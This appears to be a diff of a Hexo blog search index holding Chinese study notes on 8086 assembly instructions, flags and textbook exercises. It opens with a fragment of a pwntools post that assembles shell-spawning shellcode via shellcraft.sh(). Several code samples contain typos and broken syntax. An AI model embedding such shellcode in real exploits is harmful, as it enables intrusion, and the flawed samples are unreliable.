不过，现在我们看到的shellcode还是汇编代码，不是能用的机器码，所以还需要进行一次汇编1print(asm(shellcraft.sh())) # 打印出汇编后的shellcode asm可以对汇编代码进行汇编，不过pwntools目前的asm实现还有一些缺陷，比如不能支持相对跳转等等，只可以进行简单的汇编操作。如果需要更复杂一些的汇编功能，可以使用keystone-engine项目，这里就不再赘述了。 asm也是架构相关，所以一定要先设置context，避免一些意想不到的错误。]]></content>
+      <categories>
+        <category>pwntools</category>
+      </categories>
       <tags>
-        <tag>ctf pwn</tag>
+        <tag>pwntools</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[cmp指令]]></title>
     <url>%2F2018%2F09%2F16%2Fcmp%E6%8C%87%E4%BB%A4%2F</url>
     <content type="text"><![CDATA[cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。cmp指令格式：cmp操作对象1，操作对象2功能：计算操作对象1-操作对象2但不保存结果，仅仅根据计算结果对标志寄存器进行设置。 指令cmp ax，bx的逻辑含义是比较ax，bx中的值，如果执行后：zf=1，说明(ax)=(bx)zf=0，说明（ax）不等于（bx）cf=1，说明（ax）&lt;(bx)cf=0，说明（ax)&gt;=(bx)cf=0且zf=0，说明（ax）&gt;(bx)cf=1或zf=1,说明(ax)&lt;=(bx）]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -81,6 +103,9 @@
     <title><![CDATA[sbb指令]]></title>
     <url>%2F2018%2F09%2F16%2Fsbb%E6%8C%87%E4%BB%A4%2F</url>
     <content type="text"><![CDATA[sbb是带减法指令，它利于了CF位上记录的错位置。指令格式：sbb 操作对象1，操作对象2功能：操作对象1=操作对象1-操作对象2-CF例如：1234mov bx,1000Hmov ax,003EHsub bx,2000Hsbb ax,0020H sbb指令执行后，将对CF进行设置。利用sbb指令可以对任意大的数据进行减法运算。上面程序，就是计算003E1000H-00202000H]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -89,6 +114,9 @@
     <title><![CDATA[adc指令]]></title>
     <url>%2F2018%2F09%2F16%2Fadc%E6%8C%87%E4%BB%A4%2F</url>
     <content type="text"><![CDATA[adc是带进位加法指令指令格式：adc 操作对象1，操作对象2功能：操作对象1=操作对象1+操作对象2+CF 例如：1234mov ax,2mov bx,1sub bx,axadc ax,1 执行后，（ax）=4,abc执行时想，相当于计算：（ax）+1+CF=2+1+1=4adc指令的目的，就是来进行假发的第二步运算的。adc指令和add指令相配合就可以对更大的数据进行加法运算。]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -97,6 +125,9 @@
     <title><![CDATA[检测点11.1]]></title>
     <url>%2F2018%2F09%2F16%2F%E6%A3%80%E6%B5%8B%E7%82%B911-1%2F</url>
     <content type="text"><![CDATA[写出下面每条指令执行后，ZF、PF、SF、等标志位的值。12345678910111213sub al,al al=0h ZF=1 PF=1 SF=0 mov al,1 al=1h ZF=1 PF=1 SF=0 push ax ax=1h ZF=1 PF=1 SF=0 pop bx bx=1h ZF=1 PF=1 SF=0 add al,bl al=2h ZF=0 PF=0 SF=0 add al,10 al=12h ZF=0 PF=1 SF=0 mul al ax=144h ZF=0 PF=1 SF=0]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -105,6 +136,9 @@
     <title><![CDATA[标志寄存器]]></title>
     <url>%2F2018%2F09%2F16%2F%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8%2F</url>
     <content type="text"><![CDATA[标志寄存器（简称flag）的作用：（1）用来存储相关指令的某些执行结果。（2）用来为CPU执行相关指令提供行为依据。（3）用来控制CPU的相关工作方式。flag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器死按位起作用的，它的每一位都有专门的含义，记录特定的信息。 flag的1,3,5,12,13,14,15位在8086CPU中没有使用，不具有任何含义 ZF标志flag的第六位是ZF，零标志位。它记录相关指令执行后，其结果是否为0.如果结果为0，那么zf=1，如果结果不为0，那么zf=0 例如指令：12mov ax,1sub ax,1 执行后，结果为0，则zf=1 PF标志flag的第二位是PF，奇偶标志位，它记录相关指令执行后，其结果的所有bit位中1的个数是否位偶数。如果1的个数为偶数，pf=1，如果为奇数，那么pf=0比如指令：12mov ax,1add al,10 执行后，结果为00001011B，其中有3个1，则pf=0 SF标志flag的第七位是SF，符号标志位，它记录相关指令后，其结果是否为负。如果结果为负，sf=1，如果不为负，sf=0计算机通常用补码来表示有符号数据。计算机的UI个数据可以看做是由富豪书，也可以看做成无符号数。比如：00000001B，可以看做无符号数1，或有符号数+1；10000001B，可以看做无符号数129，也可以看作有符号数-127不管我们如何看待，CPU在执行add等指令的时候，就已经包含了两种含义，也将得到同一种信息来记录的两种结果。关键在于我们的程序需要哪一种结果。比如：12mov al,10000001Badd al,1 执行后，结果为10000010B，sf=1，表示：如果指令进行的是有符号数运算，那么结果为负；12mov al,100000001Badd al,011111111B 执行后，结果为0，sf=0，表示：如果指令进行的是有符号数运算，那么结果为非负。某些指令将影响寄存器中的多个标记为，这些被影响的标记位比较全面地记录了指令的执行结果，为相关的处理提供了所需的依据。比如指令sub，al，al执行后，ZF、PF、SF等标志位都要受到影响，它们分别为：1,1,0。 CF标志位flag的第0位是CF，进位标志位，一般情况下，在进行无符号运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。比如，123mov al,98Hadd al,al 执行后：（al）=30H，CF=1，CF记录了从最高有效位向更高位的进位值add al,al 执行后：（al）=60H，CF=0 而当两个数据做减法的时候，有可能向更高位借位，比如：123mov al,97Hsub al,98H ；执行后（al）=FFH，CF=1，CF记录了向更高位的借位值sub al,al ：执行后（al）=0，CF=0，CF记录了向更高位借位值 OF标志位flag的第十一位是OF，溢出标志位。一般情况下，OF记录了有符号数运算的结果是否发生了溢出。如果发生溢出，OF=1；如果没有，OF=0.对于无符号数运算，98+99没有进位，CF=0；对于有符号数运算，98+99发生溢出，OF=1例如：12mov al,F0Hadd al,88H add指令执行后：CF=1，OF=0.对于无符号运算，F0H+78H有进位，CF=1；对于有符号数运算，F0H+78H不发生溢出，OF=0 DF标志位flag的第10位是DF，方向标志位。在串处理指令中，控制每次操作后si，di的增减。df=0 每次操作后si、di递增df=1 每次操作后si、di递减]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -113,6 +147,9 @@
     <title><![CDATA[mul指令]]></title>
     <url>%2F2018%2F09%2F16%2Fmul%E6%8C%87%E4%BB%A4%2F</url>
     <content type="text"><![CDATA[mul指令是乘法指令规定：（1）两个项城的数，要么都是8位，要么都是16位，如果是8位，一个默认放在AL中，另一个放在8位reg或内存字单元中：如果是16位，一个默认放在AX中，另一个放在16位reg或内存子单元中。（2）结果：如果是8位乘法，结果默认放在AX中；如果是16位乘法，结果高位默认放在DX中存放，低位在AX中放。 例如：（1）计算100*10100和10 都小于255，可以做8位陈发，程序如下。123mov al,100mov bl,10mul bl 结果（ax）=1000（03E8H）（2）计算100*10000100小于255，可10000大于255，所以必须做16位乘法，程序如下：123mov ax,100mov bx,10000mul bx 结果：(ax)=4240H,(dx)=000FH (F4240H=100000)]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -121,6 +158,9 @@
     <title><![CDATA[call指令]]></title>
     <url>%2F2018%2F09%2F12%2Fcall%E6%8C%87%E4%BB%A4%2F</url>
     <content type="text"><![CDATA[CPU执行call指令时，进行两步操作：（1）将当前的IP或CS和IP压入栈中；（2）转移call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同。 call 标号依据位移进行转移的call指令CPU执行 “call 标号”指令时，进行如下操作：（1）(sp)=(sp)-2((ss)*16+(sp))=(IP)(2) (IP)=(IP)+16位位移。 16位位移=标号处的地址-call指令后的第一个直接的地址；16位位移的范围为-32768~32767，用补码表示；16位位移由编译程序在编译时算出。 CPU执行”call 标号”时，用汇编语言解释，相当于进行：push IPjmp near ptr 标号 call far ptr 标号转移的目的之地在指令中的call指令CPU执行”call far ptr 标号”指令时，进行如下的操作：(1) (sp)=(sp)-2((ss)*16+（sp))=(CS) (sp)=(sp)-2((ss)*16+(sp0=（IP）(2)(CS)=标号所在段的段地址（IP）=标号在段中的偏移地址 CPU执行”call far ptr 标号”时，用汇编语言解释，相当于进行：push CSpush IPjmp far ptr 标号 call 16 位 reg转移地址在寄存器中的call指令功能：(sp)=(sp)-2((ss)*16+(sp))=(IP)(IP)=(16位reg) 用汇编语言解释，相当于进行：push IPjmp 16位 reg call word ptr 内存单元地址转移地址在内存中的call指令 用汇编语言解释，相当于进行：push IPjmp word ptr 内存单元地址 比如：1234mov sp,10hmov as,0123hmov ds:[0],axcall word ptr ds:[0] 执行后，（IP）=0123H，（sp）=0EH call dword ptr 内存单元地址转移地址在内存中的call指令 用汇编语言解释，相当于进行：push CSpush IPjmp word ptr 内存单元地址 比如：12345mov sp,10hmov as,0123hmov ds:[0],axmov word ptr ds:[2],0call dword ptr ds:[0] 执行后，（CS）=0，（IP）=0123H，（sp）=0CH call和ret的配合使用call和ret配合使用来实现子程序先分析一下代码：12345678910111213assume cs:codecode segmentstart: mov ax,1 mov cx,3 call s mov bx,ax mov ax,4c00h int 21h s: add ax,bx loops retcode endsend start CPU执行这个程序的主要过程可以写一个具有一定功能的程序段，我们称其为子程序，在需要的时候，用call指令去执行。可是执行完子程序后，如何让CPU接着call指令向下执行？call指令去执行子程序之前，call指令后面的指令的地址将存储在栈中，所以可在子程序后面使用ret指令，用栈中的数据设置IP的值，从而转到call指令后面的代码处继续执行。 具有子程序的源程序的框架如下:123456789101112131415161718192021assume cs:codecode segmentmain: : : call sub1 : : mov ax,4c00h int 21hsub1: : : call sub2 : : retsub2: : : retcode endsend main]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -129,6 +169,9 @@
     <title><![CDATA[检测点10.1-10.5]]></title>
     <url>%2F2018%2F09%2F12%2F%E6%A3%80%E6%B5%8B%E7%82%B910-1-10-5%2F</url>
     <content type="text"><![CDATA[10.1补全程序，实现从内存1000:0000处开始执行指令1234567891011121314151617181920assume cs:codestack segmentdb 16 dup (0)stack endscode segmentmov ax,4c00hint 21hstart: mov ax,stackmov ss,axmov sp,16mov ax,0push axmov ax,1000hretfcode endsend start 程序分析： retf指令作用（CPU角度）：从栈中弹出2个字单元，并修改CS（第二个字）和IP（第一个字）；首先它弹出的是IP，其次是CS，故在压栈时，CS的值首先入栈，IP再入栈。 在汇编编程角度，retf实现了远转移。 讲解：在汇编代码这个层次，retf指令作用是修改CS和IP的值，进而使指令从修改后的地址处开始执行。由于它所依赖的是栈中存储的内容，故在压栈过程中要搞清楚入栈的顺序、入栈的值。 2.熟悉ret指令和RETF指令执行的操作。 我们编译链接后，debug跟踪check10-1.exe -d ss:0 0B66:0000 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ……………. 在stack数据区中初始化了16个0，此时它未成为栈结构。直到初始化栈的结构。 执行代码t t（二次） AX=0B66 BX=0000 CX=0026 DX=0000 SP=0010 BP=0000 SI=0000 DI=0000 DS=0B56 ES=0B56 SS=0B66 CS=0B67 IP=0008 NV UP EI PL NZ NA PO NC 0B67:0008 B80010 MOV AX,1000 -d ss:00 0B66:0000 00 00 00 00 00 00 66 0B-00 00 08 00 67 0B 68 05 ……f…..g.h. 初始化一个栈sp=0010H（16），栈地址：ss=0b66，这里我们发现一些不应该有的数据（不理会它，它是中断的信息） 继续执行代码： -d ss:0 0B66:0000 00 00 00 00 00 00 10 00-67 0B 68 05 00 00 00 10 ……..g.h….. 发现从高位开始存储10 00 00 00四个字节的数据，（体会栈是从高地址向低地址发展的，sp指针从10H减少到了0cH） 此时的CS=0B67 IP=0010 执行retf代码： 我们发现：CS=1000 IP=0000，CS和IP的值改变了。 总结：ret和RETF依赖于栈的结构存储一个程序执行点（IP或CS和IP），当执行这个代码时，可以恢复到这个程序的执行点（将栈中的数据修改IP或CS和IP，使CPU指向新的CS：IP） 10.2下面的程序执行后，ax中的数值为多少？12345678910内存地址 机器码 汇编指令 执行后情况1000:0 b8 00 00 mov ax,0 ax=0 ip指向1000:31000:3 e8 01 00 call s 读取指令后IP指向下一条指令IP为6;push 61000:6 40 inc ax1000:7 58 s:pop ax ax=6 “call 标号”是将该指令后的第一个字节偏移地址入栈，再转到标号处执行指令。 10.3下面的程序执行后，AX中的数值为多少？1234567891011内存地址 机器码 汇编指令 1000：0 b8 00 00 mov ax,0 1000：3 9A 09 00 00 10 call far ptr s ;cs为1000h，ip为8， push 1000h，push 81000：8 40 inc ax 1000：9 58 s: pop ax ;ax=8h add ax,ax ;ax=10h pop bx ;bx=1000h add ax,bx ;ax=1010h 执行call far ptr s时，取IP为8,add ax,ax ax=16BX=CS=1000H 相加转16进制ax=1010H 10.4下面的程序执行后，AX中的数值为多少？123456内存地址 机器码 汇编指令 1000：0 b8 06 00 mov ax,6 1000：3 ff d0 call ax1000：5 40 inc ax 1000：6 mov bp,sp add ax,[bp] 在执行了call ax的时候指令寄存器会指向下一条指令的起始地址，也就是1000:5 inc ax然后指令寄存器ip=5要压入堆栈然后跳转到cs:ax指定的地址执行又因为此时ax中的值为6 ,cs=1000所以跳转到1000:6执行于是修改 ip为6到此时call ax指令才执行完毕 然后就执行mov bp,sp因为sp里面放的是堆顶的地址，所以bp也是栈顶的地址了之后add ax,[bp]因为，bp里面放的是栈顶的地址，所以 [bp] 寄存器寻址后 [bp]实际是代表该地址单元的内容，也就是栈顶的内容，因为先前我把ip压入了堆栈，所以[bp]得到的内容就是5(先前在call ax时候压入的ip的值) 所以 ax=ax+[bp]也就是 ax=6+5=0BH 10.5题目：下面的程序执行后，ax中的数据是多少？123456789101112131415161718assume cs:code stack segment dw 8 dup (0) stack ends code segment start :mov ax,stack mov ss,ax mov sp,16 mov ds,ax mov ax,0 call word ptr ds:[0eH] inc ax inc ax inc ax code ends end start 解答：刚开始时mov ax,stack到mov sp,10h是分别设置ss：sp指向程序中定义的栈段stack。mov ds,ax也把数据段的段地址也设置成了stack段的段地址。call word prt ds:[0Eh]相当于是sp=sp-2，push ip，jmp word ptr ds:[0Eh]这三条指令。而sp-2就是0Eh了，push ip就是把第一条inc ax对应的ip值给压入栈。存放在ss:[0Eh]和ss:[0Fh]里面。接下来是jmp word ptr ds:[0Eh]了，它的功能就是把stack段的[0eh]子单元的值付给ip，很巧的是stack中[0eh]字单元的值就是刚刚压入的ip值。所以ip值没有改变。程序继续执行inc ax后面的程序。所以ax的值是3.]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -137,6 +180,9 @@
     <title><![CDATA[ret和retf]]></title>
     <url>%2F2018%2F09%2F12%2Fret%E5%92%8Cretf%2F</url>
     <content type="text"><![CDATA[ret指令用栈中的数据，修改IP的内容，从而实现进转移；retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移； CPU执行ret指令时，进行下面两步操作：（1） （IP)=((ss)*16+(sp))（2） (sp)=(sp)+2 CPU执行retf指令时，进行下面4部操作：(1) (IP)=((ss)16+(sp))(2) (sp)=(sp)+2(3) (CS)=((ss)16+(sp))(4) (sp)=(sp)+2 可以看出，CPU执行ret指令时，相当于进行：pop IP CPU执行retf指令时，相当于进行：pop IPpop CS 例如：1、1234567891011121314151617181920assume cs:codestack segmentdb 16 dup (0)stack endscode segmentmov ax,4c00hint 21hstart: mov ax,stackmov ss,axmov sp,16mov ax,0push axmov bx,0retcode endsend start ret指令执行后CS：IP指向代码的第一条指令2、1234567891011121314151617181920assume cs;codestack segmentdb 16 dup (0)stack endscode segmentmov ax,4c00hint 21hstart: mov ax,stackmov ss,axmov sp,16mov ax,0push cspush axmov bx,0retfcode endsend start retf指令执行后，CS：IP指向代码段的第一条指令。]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -145,6 +191,9 @@
     <title><![CDATA[操作符offset]]></title>
     <url>%2F2018%2F09%2F11%2F%E6%93%8D%E4%BD%9C%E7%AC%A6offset%2F</url>
     <content type="text"><![CDATA[操作符offest在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。比如：123456assume cs:codesgcodesg segmentstart:mov ax,offset strat ;相当于mov ax,0s: mov ax,offset s ;相当于mov ax,3codesg endsend start offset操作符取得了标号start和s的偏移地址0和3因为start是代码段中的标号，它所标记的指令是代码段中的第一条指令，偏移地址为0；而s标记的指令是代码段中的第二条指令，第一条指令长度为3个字节，则s的偏移地址为3. 又比如：]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -153,6 +202,9 @@
     <title><![CDATA[dup指令]]></title>
     <url>%2F2018%2F09%2F11%2Fdup%E6%8C%87%E4%BB%A4%2F</url>
     <content type="text"><![CDATA[dup是一个操作符，在汇编语言中同db、dw、dd、等一样。它是和db、dw、dd、等数据定义伪指令配合使用的，用来数据的重复。dup的使用格式如下：db 重复的次数 dup （重复的字节型数据）dw 重复的次数 dup （重复的字型数据）dd 重复的次数 dup （重复的双字符数据） 比如：1、3 dup (0)```123定义了三个字节，它们的值都是0，相当于db 0,0,0。2、 stack segmentdb 200 dup (0)stack ends`定义了一个容量为200个字节的栈段]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -161,6 +213,9 @@
     <title><![CDATA[div指令]]></title>
     <url>%2F2018%2F09%2F11%2Fdiv%E6%8C%87%E4%BB%A4%2F</url>
     <content type="text"><![CDATA[div是除法指令，使用div做除法时应注意以下问题。 1、除数：有8位和16位两种，在一个reg或内存单元中。2、被除数：默认放在AX或DX和AX中，如果除数位8位，被除数则为16位，默认在AX中存放；如果除数为16位，被除数则为32位，在DX和AX中存放，DX放高16位，AX存放低16位。3、结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数；如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数。 例如：1、除数为8位： 1div byte ptr ds:[0] 含义：（al）=（ax）/（（ds）*16+0）的商 （ah）=（ax）/（ds)*16+0)的余数 2、除数为16位： 1div word ptr es:[0] 含义：(ax)=[(dx)*10000H+(ax)] / ((es)*16+0)的商 （dx）=[(dx)*10000H+(ax)] / (es)*16+0)的余数 3、用除法指令计算100001/100 分析：被除数100001大于65535（ffffh），所以用dx和ax两个寄存器联合存放100001，除数100虽然小于255可以在一个8位寄存器中存放，但是，因为除数是32位的，除数应为16位，所以要用16位寄存器存放除数100100001表示为16进制为：186A1H。程序如下：1234mov dx,1mov ax,86A1H ;(dx)*10000H+(ax)=100001mov bx,100div bx 程序执行后（ax）=03E8H（即1000）（dx）=1（余数为1） 4、用除法指令计算1001/100分析：被除数1001可用ax寄存器存放，除数100可用8位寄存器存放，也就是说，要进行8位的除法。程序如下：123mov ax,1001mov bl,100div bl 程序执行后，（al）=0AH（即10），（ah）=1（余数为1） 5、]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -169,6 +224,9 @@
     <title><![CDATA[and和or指令]]></title>
     <url>%2F2018%2F09%2F11%2Fand%E5%92%8Cor%E6%8C%87%E4%BB%A4%2F</url>
     <content type="text"><![CDATA[1、and指令：逻辑与指令，按位进行与运算通过该指令可将操作对象位设为0，其他为不变 例如：12mov al,01100011Band al,00111011B 执行后al=00100011B 2、or指令：逻辑或指令，按位进行或运算。通过该指令可将操作对象位设为1，其他位不变 例如指令： 12mov al,0110001Bor al,00111011B 执行后：al=01111011B]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -177,6 +235,9 @@
     <title><![CDATA[检测点6.1]]></title>
     <url>%2F2018%2F09%2F10%2F%E6%A3%80%E6%B5%8B%E7%82%B96-1%2F</url>
     <content type="text"><![CDATA[知识点：1.用于显式地指明内存单元的段地址的”ds:” “cs:” “ss:” “es:” 在汇编语言中称为段前缀 2.Dos方式下，一般情况，0:200 - 0:2ff空间中没有系统或其他程序的数据或代码。 检测点：(1)下面的程序实现依次用内存0:0 - 0:15单元中的内容改写程序中的数据，完成程序：123456789101112131415161718assume cs:codesgcodesg segmentdw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987hstart: mov ax,0mov ds,axmov bx,0mov cx,8s: mov ax,[bx]mov cs:[bx],axadd bx,2loop smov ax,4c00hint 21hcodesg endsend start (2)下面的程序实现依次用内存0:0 - 0:15单元中的内容改写程序中的数据，数据的传送用栈来进行。栈空间设置栈程序中。完成程序：123456789101112131415161718192021assume cs:codesgcodesg segmentdw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987hdw 0,0,0,0,0,0,0,0,0,0start: mov ax,csmov ss,axmov sp,24hmov ax,0mov ds,axmov bx,0mov cx,8s: push [bx]pop [bx]add bx,2loop smov ax,4c00hint 21hcodesg endsend start]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -185,6 +246,9 @@
     <title><![CDATA[在代码段中使用栈]]></title>
     <url>%2F2018%2F09%2F10%2F%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%AE%B5%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%A0%88%2F</url>
     <content type="text"><![CDATA[1234567891011121314151617181920212223242526assum cs:codesgcode segement dw 0123H，0456H，0789H，0abcH，0defH，0fedH，0cbaH，0987H dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ;用dw定义16个字型数据，在程序加载后，将取得 16个字的内存空间，存放着6个数据。在后面的程 序中将这段空间当作栈来使用start: mov ax,cs mov ss,ax mv sp,30h ;设置栈顶ss：sp指向CS：30 mov bx,0 mov cz,8 s: push cs:[bx] add bx,2 loop s s0: pop cs[bx] add bx,2 loop s0 ;将定义的数据逆序存放 mov ax,4c00h int 21hcodesg endsend start]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -193,11 +257,20 @@
     <title><![CDATA[在代码段中使用数据]]></title>
     <url>%2F2018%2F09%2F10%2F%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%AE%B5%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%2F</url>
     <content type="text"><![CDATA[编程计算以下8个数据的和，结果存在ax寄存器中： 0123H，0456H，0789H，0abcH，0defH，0fedH，0cbaH，0987H123456789101112131415assum cs:code code segementdw 0123H，0456H，0789H，0abcH，0defH，0fedH，0cbaH，0987Hmov bx,0mov ax,0mov cz,8s: add ax,cs:[bx]add bx,2loop smov ax,4c00hint 21hcode endsend dw的含义是定义字型数据，dw即“define word”，在这里，使用dw定义了8个字型数据，它们所占的内存空间的大小为16个字节。程序在运行的时候cs中存放代码段的段地址，所以可以从cs中得到它们的段地址 因为用dw定义的数据处于代码段的最开始，所以偏移地址为0，这8个数据就在代码段的偏移0、2、4、6、8、A、C、E处。程序运行时，它们的地址就是CS：0、CS：2、CS：4、CS：6、CS：8、CS：A、CS：C、CS：E。用bx存放加2递增的偏移地址用循环来进行累加。在循环开始前,设置（bx）=0，CS：BX指向第一个数据存放的字单元。每次循环中（bx）=（bx）+2，CS：BX指向下一个数据所在的字单元。]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
+      <tags>
+        <tag>汇编语言</tag>
+      </tags>
   </entry>
   <entry>
     <title><![CDATA[Loop指令]]></title>
     <url>%2F2018%2F09%2F10%2FLoop%E6%8C%87%E4%BB%A4%2F</url>
     <content type="text"><![CDATA[loop指令的格式是：loop 标号CPU执行loop指令的时候，要进行两步操作，1、(cx)=(cx)-12、判断cx中的值，不为零则转至标号处执行，如果为零则向下执行 例子1：计算2的十二次方123456789101112assume cs:code code segmentmov ax,2mov cx,11s: add ax,axloop smov ax,4c00Hint 21Hcode endsend 例子2：用加法计算123*236 123456789101112assume cs:codecode segmentmov ax,0mov cx,123s: add ax,236loop smov ax,4c00Hint 21Hcode endsend]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -206,6 +279,9 @@
     <title><![CDATA[寄存器（内存访问）]]></title>
     <url>%2F2018%2F09%2F08%2F%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE%EF%BC%89%2F</url>
     <content type="text"><![CDATA[寄存器（内存访问）内存中字的存储 DS和[address] 8086CPU中有一个DS寄存器，通常用来存放要访问数据的地址段 [address]表示一个内存单元，address表示内存单元的偏移地址 如果要读取10000H单元的内容，可以用如下的程序段进行 mov bx,1000H mov ds,bx mov al,[0] 上面的3条指令将10000H（1000：0）中的数据读到al中 字的传送mov bx,1000H mov ds,bx mov ax,[0] ;1000:0处的数据送入ax mov [0],cx ;cx中的16位数据送到1000:0处 问题1 问题2 问题3 检测点3.1(1)在Debug 中，用”d 0:0 1f” 查看内存，结果如下： 0000:0000 70 80 F0 30 EF 60 30 E2-00 80 80 12 66 20 22 60 0000:0010 62 26 E6 D6 CC 2E 3C 3B-AB BA 00 00 26 06 66 88 下面的程序执行前，AX=0,BX=0，写出每条汇编指令执行完毕后相关寄存器中的值： Mov ax,1 Mov ds,ax Mov ax,[0000] AX=2662 Mov bx,[0001] BX=E626 Mov ax,bx AX=E626 Mov ax,[0000] AX=2662 Mov bx,[0002] BX=D6E6 Add ax,bx AX=FD48 Add ax,[0004] AX=2C14 Mov ax,0 AX=0 Mov al,[0002] AX=00E6 Mov bx,0 BX=0 Mov bl,[000C] BX=0026 Add al,bl AX=000C (2) mov ax,6622H CS=2000H IP=0002H jmp 0ff0:0100 CS=0ff0H IP=0100H 物理地址=CS*16+IP=10000H mov ax,2000H CS=0ff0H IP=0103H mov ds,ax CS=0ff0H IP=0105H mov ax,[0008] CS=0ff0H IP=0108H mov ax,[0002] CS=0ff0H Ip=010BH 第一步：CS=2000H，IP=0H 地址：20000H 读取第一条指令 mov ax,6622H CS=2000H, IP=03H 执行指令 mov ax,6622H 执行结果：AX=6622H 第二步：地址：20003H 读取第二条指令 jmp 0ff0:0100 CS=2000H,IP=03H 执行指令：jmp 0ff0:0100 执行结果：CS=0ff0H, IP=0100H 第三步：地址：CSx16+IP = 10000H 读取指令：mov ax,2000H CS=0ff0H, IP=0103H 执行指令：mov ax,2000H 执行结果：AX=2000H 第四步：地址：10003H 读取指令：mov ds,ax CS=0ff0H, IP=0105H 执行指令：mov ds,ax 执行结果：ds=2000H 第五步：地址：10005H 读取指令：mov ax,[0008] CS=0ff0H，IP=10008H，DS=2000H 执行指令：mov ax,[0008] ; 也就是将地址【DS：IP】为 2000H：0008H的值移动到AX 执行结果：AX=C189H 第六步：读取指令：mov ax,[0002] CS=0ff0H ,IP=1000BH,DS=2000H 执行指令：mov ax,[0002] 执行结果：AX=EA66 知识点： 任意时刻SS:SP 指向栈顶元素。 push指令和pop指令执行时，CPU从 SS和SP中得到栈顶的地址。 注：SS(Stack Segmet)堆栈段寄存器，指向当前的堆栈段。 SP(Stack Pointer)堆栈指针寄存器，主要用于堆栈操作，存放堆栈段首地 址到栈顶单元的偏移量。 入栈时：886CPU栈顶从高地址向低地址方向增长。 CPU提供的栈机制CS、IP中存放着当前指令的段地址和偏移地址，而段寄存器SS和寄存器SP为CPU的入栈，出栈服务。任意时刻SS：SP指向栈顶元素。 问题1如果将10000H~1000Fh这段空间当作栈，初始空间是空的，此时，SS=1000H，SP=0010H 问题2利用栈，交换AX和BX中的数据 mov ax,1000H mov ss,ax mov sp,0010H ;初始化栈顶 mov ax=001AH mov bx=001BH push ax push bx pop ax ；当前栈顶的数据是bx中的欲来的数据，所以先pop ax，即ax=001BH pop bx ；执行pop ax后，栈顶的数据为ax原来的数据，所以再pop bx，即bx=001AH 问题3利用栈在10000H处写入数据2266H mov ax,1000H mov ss,ax mov sp,0002H mov ax,2266H push ax 一般写法 mov ax,1000H mov ds,ax mov ax,2266H mov [0],ax]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -214,6 +290,9 @@
     <title><![CDATA[寄存器]]></title>
     <url>%2F2018%2F09%2F07%2F%E5%AF%84%E5%AD%98%E5%99%A8%2F</url>
